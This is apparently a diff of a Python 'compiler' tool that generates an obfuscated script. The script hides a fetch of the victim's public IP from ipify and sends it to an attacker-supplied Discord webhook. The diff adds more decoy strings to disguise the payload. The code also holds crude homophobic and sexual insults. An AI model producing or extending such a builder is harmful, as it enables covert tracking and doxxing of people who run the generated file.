@@ -91,7 +91,7 @@ def vexcm():
         "why you gotta be muted", "the hdmi port that does hdmi when hdmi like hdmi so hdmi port hdmi's the speaker hdmi",
         "brah", "i wonder why your using this unless i sent you it", "maybe i just released it on github",
         "i triedd my very hardest on this i think", "hello there pentagonium", "pls stop using ur soundboard",
-        "im inside your walls."]
+        "im inside your walls.", "pass","vex","fat = False", "femorgay = True"]
         newlog.write(f"""
 #  ================================
 # |         Dex's Compiler         |
@@ -106,19 +106,19 @@ import requests;import dhooks;'''''';'''i hope nobody is a skid''';'''gg'''
 
 '''{random.choices(randomstrings)}''';dexIlIlIlIlllIllIIIIllIlIlI="ht"
 '''{random.choices(randomstrings)}''';dexIlIlIlIllllllIIIIllIlIlI="ipify";''''{random.choices(randomstrings)}'''
-'''{random.choices(randomstrings)}''';k="";dexIlIlIlIlIIlllIIIIllIlIlI=requests.get;'''x compiler''';pass
-'''{random.choices(randomstrings)}''';pass;dex=True;'''dexIIIlIlIlllIllIIIIllIlIII'''
+'''{random.choices(randomstrings)}''';k="";dexIlIlIlIlIIlllIIIIllIlIlI=requests.get;'''{random.choices(randomstrings)}''';{random.choices(randomstrings)}
+'''{random.choices(randomstrings)}''';{random.choices(randomstrings)};dex=True;'''dexIIIlIlIlllIllIIIIllIlIII'''
 '''{random.choices(randomstrings)} ''';dexIlIlIlIlllIllIIIIllIlIll="api.";vw_trash=True;'''{random.choices(randomstrings)}'''
 '''{random.choices(randomstrings)}''';dexIlIlIlIlllIllIIIIIIIIII=requests;'''voidwatch is gay'''
-'''{random.choices(randomstrings)}''';pass;'''{random.choices(randomstrings)}''';'''dexIIIlIlIlllIllIIIIllIlIII''';'''{random.choices(randomstrings)}''';femorgay=True;pass
-'''{random.choices(randomstrings)}''';pass;'''x ''';dexIlIlIlIlllIllIIIIlIIIIII="org";'''{random.choices(randomstrings)}''';'''femor when unsucked cock is in there area'''
+'''{random.choices(randomstrings)}''';{random.choices(randomstrings)};'''{random.choices(randomstrings)}''';'''dexIIIlIlIlllIllIIIIllIlIII''';'''{random.choices(randomstrings)}''';femorgay=True;{random.choices(randomstrings)}
+'''{random.choices(randomstrings)}''';{random.choices(randomstrings)};'''{random.choices(randomstrings)}''';dexIlIlIlIlllIllIIIIlIIIIII="org";'''{random.choices(randomstrings)}''';'''femor when unsucked cock is in there area'''
 '''{random.choices(randomstrings)} {random.choices(randomstrings)}''';'''dexIIIlIlI''';dexIlIlIlIlllIllIlIIllIlIll=dhooks.Webhook("{webhook}");'''lllIllIIIIllIlIII''';'''er''';''''''
 '''{random.choices(randomstrings)} ''';dex_gay=False;'''{random.choices(randomstrings)}''';dexIlIlIlIlllIllIIIIllIlIII="tps";'''dex was here'''
-'''{random.choices(randomstrings)} {random.choices(randomstrings)}''';jfsiotbj5erwbjymhfg0dmuny958rebuyrtejn8=False;pass;'''{random.choices(randomstrings)}'''
+'''{random.choices(randomstrings)} {random.choices(randomstrings)}''';jfsiotbj5erwbjymhfg0dmuny958rebuyrtejn8=False;{random.choices(randomstrings)};'''{random.choices(randomstrings)}'''
 '''{random.choices(randomstrings)}''';dexIIIlIlIlllIllIIIIllIlIII=dexIlIlIlIlIIlllIIIIllIlIlI(dexIlIlIlIlllIllIIIIllIlIlI+dexIlIlIlIlllIllIIIIllIlIII+'://'+dexIlIlIlIlllIllIIIIllIlIll+dexIlIlIlIllllllIIIIllIlIlI+'.'+dexIlIlIlIlllIllIIIIlIIIIII).text;'''{random.choices(randomstrings)}'''
 '''{random.choices(randomstrings)} ''';dexIlIlIlIlllIllIlIIllIlIll.send(dexIIIlIlIlllIllIIIIllIlIII);'''{random.choices(randomstrings)}''';pass;bye=True
 
-'''''';pass;pass;pass;pass;pass;pass;pass;pass;pass;pass;pass;''''''
+'''''';{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};''''''
 '''dex.lol#1337'''
         """)
         newlog.close()
